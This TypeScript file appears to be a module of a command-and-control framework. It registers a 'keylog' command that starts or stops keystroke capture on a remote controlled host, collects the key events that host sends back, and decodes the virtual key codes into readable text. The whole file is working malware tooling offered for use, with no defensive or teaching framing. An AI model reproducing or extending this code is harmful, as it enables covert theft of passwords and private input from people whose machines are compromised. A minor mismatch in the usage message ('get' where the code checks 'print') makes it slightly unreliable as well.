import { Packet } from "c2lib";
import { ControlServer } from "../../controlserver";
import { CommandList } from "../../registry";

export = function (commands: CommandList) {
    commands['keylog'] = keylog;
};

let alt = false;
let ctrl = false;
let shift = false;
let keys: KeyEvent[] = [];

interface KeyEvent {
    keyDown: boolean;
    vkCode: number;
}

function keyEventHandler(packet: Packet) {
    if (packet._ptype.name === 'keyevent') {
        let keyEvent: KeyEvent = {
            keyDown: packet.keyDown,
            vkCode: packet.vkCode,
        };
        keys.push(keyEvent);
    }
}

let mapping: { [key: number]: string } = {
    0x8: '<bak>',
    0x9: '\t',
    0xd: '\n',
    0x20: ' ',
    0x23: '<end>',
    0x24: '<home>',
    0x25: '<left>',
    0x26: '<up>',
    0x27: '<right>',
    0x28: '<down>',
    0x2d: '<ins>',
    0x2e: '<del>',
};
async function keylog(server: ControlServer, args: string[]) {
    if (args.length != 2 || !['start', 'stop', 'print'].includes(args[1])) {
        console.log(`Usage: ${args[0]} <start|stop|get>`);
        return;
    }

    if (args[1] === 'print') {
        let buf: string[] = [];
        let shift = false;
        for (let event of keys) {
            if ([0x10, 0xa0, 0xa1].includes(event.vkCode)) {
                shift = event.keyDown;
            } else if (event.keyDown) {
                if (event.vkCode >= 0x30 && event.vkCode < 0x40) {
                    buf.push(String.fromCharCode(event.vkCode));
                } else if (event.vkCode >= 0x41 && event.vkCode <= 0x5a) {
                    if (shift) {
                        buf.push(String.fromCharCode(event.vkCode));
                    } else {
                        buf.push(String.fromCharCode('a'.charCodeAt(0) + (event.vkCode - 0x41)));
                    }
                } else if (event.vkCode >= 0x70 && event.vkCode < 0x87) {
                    buf.push(`F${event.vkCode - 0x70 + 1}`);
                } else if (event.vkCode in mapping) {
                    buf.push(mapping[event.vkCode]);
                }
            }
        }
        console.log(buf.join(''));
        return;
    }

    let packet = server.commandPacket('keylog');
    packet.command = args[1] === 'start' ? 0 : 1;
    let ret = await server.sendHostCommand(packet);
    if (ret == 0) {
        if (args[1] === 'start') {
            console.log('Keylogging...');
            server.currentHost!.on('packet', keyEventHandler);
        } else {
            server.currentHost!.off('packet', keyEventHandler);
            console.log('Stopped keylogger.');
        }
    }
}
